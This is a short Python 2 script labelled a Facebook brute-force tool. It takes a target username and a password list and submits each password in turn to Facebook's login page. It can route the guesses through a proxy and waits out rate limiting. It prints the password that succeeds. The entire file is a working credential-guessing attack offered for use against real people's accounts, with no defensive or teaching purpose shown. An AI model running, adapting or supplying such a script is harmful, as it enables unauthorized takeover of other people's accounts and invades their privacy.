_Author_="Joychondroghosh@gmail.com"
__version__ = "0.1Joy"

import time
import getopt
import sys
import httplib
import urllib
import re

HEADERS = {
    "Content-type": "application/x-www-form-urlencoded", 
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
    "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:9.0.1) Gecko/20100101 Firefox/9.0.1",
#    "Accept-Encoding": "gzip, deflate",
    "Accept-Charset": "ISO-8859-1,utf-8;q=0.7,*;q=0.7",
    "Cookie": "locale=es_LA"
}

DATA = {
    "return_session": 0, 
    "legacy_return": 1, 
    "display": "", 
    "session_key_only": 0, 
    "trynum": 1, 
    "timezone": 360, 
    "persistent": 1, 
    "default_persistent": 1, 
    "login": "Entrar"
}

def main(argv):
    error, options = parse_args(argv)

    if error or "help" in options:
        usage()
        return

    DATA["email"] = options["username"]

    host = "www.facebook.com"
    port = 80
    resource = "/login.php"

    if "proxy" in options:
        host, port = options["proxy"].split(":")
        resource = "http://www.facebook.com/login.php"
    
    running = True
    waiting = False
    found = False
    count = 1

    while running:
        if not waiting:
            count = 1
            passwd = unicode(options["passdb"].readline().strip(), options["encoding"])

        if not passwd:
            break

        try:
            waiting = False
            print "Trying: {0}".format(passwd.encode(options["encoding"]))

            
            conn = httplib.HTTPConnection(host, port)

            # needs to be encoded in utf-8 for urlencode
            DATA["pass"] = passwd.encode("utf-8")
            params = urllib.urlencode(DATA)

            conn.request("POST", resource, params, HEADERS)
            response = conn.getresponse()

            response = response.read()
            conn.close()
            
            if len(response.strip()) == 0:
                found = True
                print "SUCCESS: {0}".format(passwd.encode(options["encoding"]))
                break
            elif response.find("menudo") != -1:
                waiting = True
                print "Waiting..."
                time.sleep(60 * count)

                count += 1
        except Exception, err:
            print "An error ocurred: ", str(err)

    if not found:
        print "FAILED: Password list Doesen't have Matching Password Use Another list!"

def parse_args(argv):
    options = { "encoding": "utf-8" }
    error = False

    try:
        opts, args = getopt.getopt(argv, "u:p:e:P:h", ["username=", "passdb=", "encoding=", "proxy=", "help"])

        for opt, arg in opts:
            if opt in ("-u", "--username"):
                options["username"] = arg
            elif opt in ("-p", "--passdb"):
                options["passdb"] = open(arg)
            elif opt in ("-e", "--encoding"):
                options["encoding"] = arg
            elif opt in ("-P", "--proxy"):
                if not re.search("^(\w+|\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}):\d+$", arg):
                    raise Exception("Invalid format for proxy, should be host:port")

                options["proxy"] = arg
            elif opt in ("-h", "--help"):
                options["help"] = True
            else:
                error = True
    except Exception, err:
        error = True
        print str(err)

    if "username" not in options or "passdb" not in options:
        error = True
        
    return error, options

def usage():
    print """Fb Bruteforce Tool By Joy Ghosh Works On Windows Also


How to Use:

fb.py -u (Username) -p (password list name) [-e encoding] [-P proxy:port]""".format(__version__)

if __name__ == "__main__":
    main(sys.argv[1:])